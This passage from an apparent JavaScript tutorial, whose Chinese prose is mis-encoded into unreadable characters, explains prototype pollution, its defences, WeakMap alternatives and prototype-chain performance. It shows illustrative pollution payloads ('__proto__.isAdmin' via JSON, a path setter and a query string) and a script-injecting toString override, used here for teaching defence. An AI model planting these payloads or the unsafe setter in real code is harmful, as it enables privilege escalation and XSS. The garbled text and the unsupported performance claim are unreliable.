class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> maliciousJSON = <span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#x27;</span>;<br><span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(maliciousJSON); <span class="hljs-comment">// åœ¨æŸäº›å¼•æ“ä¸­ä¼šæ±¡æŸ“åŸå‹</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰è·¯å¾„èµ‹å€¼æ“ä½œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params">obj, path, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> parts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>  <span class="hljs-keyword">let</span> current = obj;<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (!current[parts[i]]) &#123;<br>      current[parts[i]] = &#123;&#125;;<br>    &#125;<br>    current = current[parts[i]];<br>  &#125;<br>  <br>  current[parts[parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]] = value;<br>&#125;<br><br><span class="hljs-comment">// æ”»å‡»è€…å¯ä»¥ä¼ å…¥æ¶æ„è·¯å¾„</span><br><span class="hljs-title function_">setValue</span>(&#123;&#125;, <span class="hljs-string">&#x27;__proto__.isAdmin&#x27;</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨å½±å“åˆ†æ</strong></p><p>ï¼ˆ1ï¼‰æƒé™æå‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‡è®¾ç³»ç»Ÿæ£€æŸ¥æƒé™çš„æ–¹å¼</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkPermission</span>(<span class="hljs-params">user</span>) &#123;<br>  <span class="hljs-keyword">if</span> (user.<span class="hljs-property">isAdmin</span>) &#123;<br>    <span class="hljs-title function_">grantAdminAccess</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ±¡æŸ“åæ‰€æœ‰ç”¨æˆ·éƒ½å˜æˆç®¡ç†å‘˜</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-title function_">checkPermission</span>(&#123;&#125;); <span class="hljs-comment">// è·å¾—ç®¡ç†å‘˜æƒé™</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰XSS æ”»å‡»å¢å¼º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ±¡æŸ“toStringæ–¹æ³•</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;maliciousCode()&lt;/script&gt;&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// å½“ç³»ç»Ÿè°ƒç”¨toStringæ—¶</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = someObject.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// æ‰§è¡Œæ¶æ„ä»£ç </span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æœåŠ¡ç«¯æ¼æ´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‡è®¾Expressä¸­æœ‰è¿™æ ·çš„ä»£ç </span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">isAdmin</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sensitiveData</span>();<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// æ”»å‡»è€…å¯ä»¥å‘é€æ±¡æŸ“è¯·æ±‚</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/user?__proto__.isAdmin=true&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="7-2-å¦‚ä½•é˜²å¾¡åŸå‹æ±¡æŸ“ï¼Ÿ"><a href="#7-2-å¦‚ä½•é˜²å¾¡åŸå‹æ±¡æŸ“ï¼Ÿ" class="headerlink" title="7.2 å¦‚ä½•é˜²å¾¡åŸå‹æ±¡æŸ“ï¼Ÿ"></a>7.2 å¦‚ä½•é˜²å¾¡åŸå‹æ±¡æŸ“ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰ä½¿ç”¨ Object.create(null)åˆ›å»ºçº¯å‡€å¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> safeObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br>safeObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(safeObj.<span class="hljs-property">hasOwnProperty</span>); <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å®‰å…¨çš„å¯¹è±¡åˆå¹¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeMerge</span>(<span class="hljs-params">target, source</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, target, source);<br>  <span class="hljs-comment">// æˆ–ä½¿ç”¨å±•å¼€è¿ç®—ç¬¦</span><br>  <span class="hljs-comment">// return &#123; ...target, ...source &#125;;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰åŸå‹å±æ€§æ£€æŸ¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params">obj, path, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> parts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>  <span class="hljs-keyword">let</span> current = obj;<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (parts[i] === <span class="hljs-string">&#x27;__proto__&#x27;</span> || parts[i] === <span class="hljs-string">&#x27;constructor&#x27;</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Prototype pollution attempt&#x27;</span>);<br>    &#125;<br>    <span class="hljs-comment">// ...å…¶ä½™é€»è¾‘</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ä½¿ç”¨ Map ä»£æ›¿ Object</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> safeMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>safeMap.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><span class="hljs-comment">// æ— æ³•é€šè¿‡åŸå‹é“¾æ±¡æŸ“</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰å†»ç»“åŸå‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure><h2 id="7-3-ä½¿ç”¨-WeakMap-æ›¿ä»£åŸå‹æ‰©å±•"><a href="#7-3-ä½¿ç”¨-WeakMap-æ›¿ä»£åŸå‹æ‰©å±•" class="headerlink" title="7.3 ä½¿ç”¨Â WeakMapÂ æ›¿ä»£åŸå‹æ‰©å±•"></a>7.3 ä½¿ç”¨Â <code>WeakMap</code>Â æ›¿ä»£åŸå‹æ‰©å±•</h2><p><strong>ä¼ ç»ŸåŸå‹æ‰©å±•å­˜åœ¨çš„é—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‘åŸå‹æ·»åŠ æ–¹æ³•</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];<br>&#125;;<br><br><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">last</span>()); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ1ï¼‰å…¨å±€æ±¡æŸ“ï¼šå½±å“æ‰€æœ‰åŒç±»å¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// ä¼šè¾“å‡º &quot;last&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å‘½åå†²çª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;A&#x27;</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;B&#x27;</span> &#125;; <span class="hljs-comment">// è¢«è¦†ç›–</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å®‰å…¨é£é™©</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ¶æ„ä»£ç å¯èƒ½ä¿®æ”¹åŸç”Ÿæ–¹æ³•</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* æ¶æ„æ“ä½œ */</span> &#125;;<br></code></pre></td></tr></table></figure><p><strong>æ›¿ä»£æ–¹æ¡ˆ</strong></p><p>ï¼ˆ1ï¼‰ç§æœ‰æ•°æ®å­˜å‚¨æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> privateData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    privateData.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, &#123; name &#125;);<br>  &#125;<br>  <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> privateData.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);      <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ–¹æ³•æ‰©å±•æ›¿ä»£æ–¹æ¡ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arrayExtensions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">extendArray</span>(<span class="hljs-params">arr</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!arrayExtensions.<span class="hljs-title function_">has</span>(arr)) &#123;<br>    arrayExtensions.<span class="hljs-title function_">set</span>(arr, &#123;<br>      <span class="hljs-attr">last</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];<br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// å°†æ–¹æ³•ç»‘å®šåˆ°å®ä¾‹</span><br>    arr.<span class="hljs-property">last</span> = arrayExtensions.<span class="hljs-title function_">get</span>(arr).<span class="hljs-property">last</span>.<span class="hljs-title function_">bind</span>(arr);<br>  &#125;<br>  <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-keyword">const</span> myArr = <span class="hljs-title function_">extendArray</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myArr.<span class="hljs-title function_">last</span>()); <span class="hljs-comment">// 3</span><br><br><span class="hljs-comment">// ä¸å½±å“å…¶ä»–æ•°ç»„</span><br><span class="hljs-keyword">const</span> normalArr = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(normalArr.<span class="hljs-property">last</span>); <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å…ƒæ•°æ®å…³è”æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addMetadata</span>(<span class="hljs-params">obj, data</span>) &#123;<br>  metadata.<span class="hljs-title function_">set</span>(obj, data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getMetadata</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> metadata.<span class="hljs-title function_">get</span>(obj);<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-title function_">addMetadata</span>(obj, &#123; <span class="hljs-attr">created</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getMetadata</span>(obj)); <span class="hljs-comment">// &#123; created: 162... &#125;</span><br></code></pre></td></tr></table></figure><h2 id="7-4-æ€§èƒ½ä¼˜åŒ–ï¼šå‡å°‘åŸå‹é“¾æ·±åº¦"><a href="#7-4-æ€§èƒ½ä¼˜åŒ–ï¼šå‡å°‘åŸå‹é“¾æ·±åº¦" class="headerlink" title="7.4 æ€§èƒ½ä¼˜åŒ–ï¼šå‡å°‘åŸå‹é“¾æ·±åº¦"></a>7.4 æ€§èƒ½ä¼˜åŒ–ï¼šå‡å°‘åŸå‹é“¾æ·±åº¦</h2><p><strong>åŸå‹é“¾æ·±åº¦å¯¹æ€§èƒ½çš„å½±å“æœºåˆ¶</strong></p><ul><li>å±æ€§æŸ¥æ‰¾ï¼šæ¯çº§åŸå‹é“¾å¢åŠ  10% ï½ 20% çš„æŸ¥æ‰¾æ—¶é—´ï¼ˆV8 å¼•æ“æ•°æ®ï¼‰</li><li>ç¼“å­˜å¤±æ•ˆï¼šç°ä»£ JavaScript å¼•æ“çš„éšè—ç±»ä¼˜åŒ–ä¼šè¢«è¿‡æ·±åŸå‹é“¾ç ´å</li><li>å†…å­˜å ç”¨ï¼šæ¯çº§åŸå‹é“¾éœ€è¦é¢å¤–çš„å†…å­˜å­˜å‚¨å¼•ç”¨</li></ul><p><strong>æµ‹è¯•åŸå‹é“¾æ·±åº¦çš„å½±å“</strong></p><p>åŸºå‡†æµ‹è¯•ç”¨ä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºä¸åŒæ·±åº¦çš„åŸå‹é“¾</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createChain</span>(<span class="hljs-params">depth</span>) &#123;<br>  <span class="hljs-keyword">let</span> current = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; depth; i++) &#123;<br>    <span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(current);<br>    newObj[<span class="hljs-string">`prop<span class="hljs-subst">$&#123;i&#125;</span>`</span>] = i;<br>    current = newObj;<br>  &#125;<br>  <span class="hljs-keyword">return</span> current;<br>&#125;<br><br><span class="hljs-comment">// æµ‹è¯•å±æ€§è®¿é—®é€Ÿåº¦</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">testAccess</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) &#123;<br>    obj[prop];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;<br>&#125;<br><br><span class="hljs-keyword">const</span> depths = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>];<br>depths.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">depth</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> obj = <span class="hljs-title function_">createChain</span>(depth);<br>  <span class="hljs-keyword">const</span> time = <span class="hljs-title function_">testAccess</span>(obj, <span class="hljs-string">`prop<span class="hljs-subst">$&#123;depth-<span class="hljs-number">1</span>&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Depth <span class="hljs-subst">$&#123;depth&#125;</span>: <span class="hljs-subst">$&#123;time.toFixed(<span class="hljs-number">2</span>)&#125;</span>ms`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœï¼ˆChrome 137.0.7151.120ï¼ˆæ­£å¼ç‰ˆæœ¬ï¼‰ (x86_64)ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Depth</span> <span class="hljs-number">1</span>: <span class="hljs-number">3.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">3</span>: <span class="hljs-number">11.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">5</span>: <span class="hljs-number">12.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">10</span>: <span class="hljs-number">10.</span>00ms<br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–ç­–ç•¥</strong></p><p>ï¼ˆ1ï¼‰æ‰å¹³åŒ–ç»§æ‰¿ç»“æ„</p><p>ä¼˜åŒ–å‰ï¼ˆä¼ ç»Ÿæ·±ç»§æ‰¿ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-title function_">methodA</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span> &#123; <span class="hljs-title function_">methodB</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">B</span> &#123; <span class="hljs-title function_">methodC</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-comment">// åŸå‹é“¾ï¼šC â†’ B â†’ A â†’ Object</span><br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åï¼ˆç»„åˆ+æ‰å¹³ï¼‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span> = &#123;<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodA&#x27;</span>),<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodB&#x27;</span>),<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodC&#x27;</span>)<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">methodA</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodA</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>  <span class="hljs-title function_">methodB</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodB</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>  <span class="hljs-title function_">methodC</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodC</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>&#125;<br><span class="hljs-comment">// åŸå‹é“¾ï¼šBase â†’ Object</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ–¹æ³•ç›´æ¥æŒ‚è½½å®ä¾‹</p><p>ä¼˜åŒ–å‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = heavyData;<br>  &#125;<br>  <br>  <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* é¢‘ç¹è°ƒç”¨çš„æ–¹æ³• */</span> &#125;<br>&#125;<br><span class="hljs-comment">// æ–¹æ³•åœ¨åŸå‹ä¸Šï¼Œæ¯æ¬¡è®¿é—®éœ€è¦æŸ¥é“¾</span><br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 